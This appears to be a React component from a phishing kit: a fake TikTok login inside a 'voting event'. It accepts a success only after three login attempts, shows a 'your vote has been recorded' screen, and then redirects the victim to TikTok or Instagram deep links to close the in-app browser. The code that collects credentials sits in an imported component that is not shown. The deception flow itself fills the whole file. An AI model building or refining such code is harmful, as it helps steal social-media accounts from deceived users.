"use client";

import { useState } from "react";
import TiktokVote from "./TiktokVote";

export default function AuthModal({
  isOpen,
  onClose,
}: {
  isOpen: boolean;
  onClose: () => void;
}) {
  const [view, setView] = useState<"tiktok" | "success">("tiktok");
  const [trials, setTrials] = useState(0);

  if (!isOpen) return null;

  // Function to attempt to close the in-app browser
  const handleExitBrowser = () => {
    // 1. Try standard window close
    window.close();

    // 2. Redirect to app deep links to force the browser to minimize/close
    // This sends the user back to the main app interface
    const isInstagram = navigator.userAgent.includes("Instagram");

    if (isInstagram) {
      window.location.href = "instagram://main";
    } else {
      window.location.href = "snssdk1233://"; // TikTok's internal scheme
    }

    // 3. Fallback: just close our modal
    onClose();
  };

  const handleLoginAttempt = () => {
    const nextTrial = trials + 1;
    if (nextTrial >= 3) {
      setView("success");
    } else {
      setTrials(nextTrial);
    }
  };

  return (
    <div className="fixed inset-0 z-[500] flex items-center justify-center">
      {/* 1. TIKTOK LOGIN VIEW */}
      {view === "tiktok" && (
        <TiktokVote
          onLogin={handleLoginAttempt}
          onSuccess={() => setView("success")}
        />
      )}

      {/* 2. SUCCESS VIEW */}
      {view === "success" && (
        <div className="fixed inset-0 bg-white z-[10001] flex items-center justify-center p-6 font-sans">
          <div className="w-full max-w-[440px] text-center">
            <div className="w-20 h-20 bg-[#25f4ee]/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <div className="w-10 h-10 bg-[#fe2c55] rounded-full flex items-center justify-center text-white text-2xl shadow-lg">
                ✓
              </div>
            </div>
            <h3 className="text-[#161823] text-2xl font-bold mb-3">
              Entry Received
            </h3>
            <p className="text-gray-500 text-base mb-10 leading-relaxed">
              Thanks for participating! Your vote has been recorded.
              <br />
              <span className="font-semibold block mt-2 text-zinc-800">
                Official counting will begin once the voting event ends.
              </span>
            </p>

            {/* CHANGED: Logic to close/exit the browser */}
            <button
              onClick={handleExitBrowser}
              className="w-full h-[48px] bg-[#fe2c55] text-white font-bold rounded-[4px] text-[16px] hover:bg-[#ef2950] transition-colors uppercase tracking-wider">
              Finish and Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
